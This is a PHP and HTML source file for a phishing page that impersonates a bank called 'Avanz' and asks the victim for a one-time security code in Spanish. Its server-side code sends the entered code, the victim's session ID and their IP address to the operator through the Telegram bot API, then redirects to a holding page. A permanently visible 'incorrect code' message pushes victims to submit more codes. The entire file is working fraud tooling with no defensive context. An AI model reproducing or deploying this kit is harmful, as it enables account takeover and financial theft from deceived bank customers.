<?php
session_start();
include("settings.php");

$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
    header("Location: index.php");
    exit;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $codigo = $_POST['int1'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $msg = "🔐 Nuevo código AVANZ \n";
    $msg .= "🆔 ID: $usuario\n";
    $msg .= "🔢 Código: $codigo\n";
    $msg .= "📍 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg
    ]));

    header("Location: sleep.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avanz - Verificación</title>
    <style>
        .tem {
            color: #333;
            border: 1px solid rgb(182, 181, 181);
            border-radius: 3px;
            height: 39px;
            width: 340px;
            padding-left: 12px;
            outline: none;
            font-size: 16px;
            font-family: sans-serif;
        }

        .masa3 {
            width: 100%;
            height: 20px;
            margin: 0px;
            background-color: #005961;
            padding: 5px;
        }

        .met {
            font-family: sans-serif;
            font-size: 15px;
            min-width: 126px;
            text-transform: uppercase;
            padding: 5px 20px;
            border: none;
            color: #fff;
            background: #FF7500;
            cursor: pointer;
        }

        #iot {
            font-size: 15px;
            color: red;
            font-family: sans-serif;
            float: left;
            display: block; /* SIEMPRE visible */
        }
    </style>
</head>
<body style="margin: 0;">
    <div style="width: 100%; height: 70px; padding: 10px; margin-left: 10px;">
        <img width="120px" src="img/lk.svg" alt="">
    </div>

    <div class="masa3">
        <center>
            <img style="margin-top: 3px; width: 15px;" src="img/icon-login.png" alt="">
        </center>
    </div>

    <div style="padding: 5px;">
        <center>
            <form method="post" style="width: 350px; margin-left: -10px;">
                <br>
                <p style="font-family: sans-serif; color: rgb(105, 105, 105);">
                    Hemos enviado un código de seguridad al número de teléfono o correo electrónico registrado, ingrésalo para continuar.
                </p>
                <br>

                <p style="font-family: sans-serif; float: left; margin-left: 20px; color: rgb(105, 105, 105);">
                    Ingresa el Código de Seguridad
                </p>
                <input inputmode="numeric" class="tem" type="text" name="int1" id="codigo" placeholder="Código" maxlength="8">
                <p id="iot">Código incorrecto, inténtalo nuevamente</p>

                <br><br><br>
                <input class="met" type="submit" value="CONTINUAR">
            </form>
        </center>
    </div>
</body>
</html>
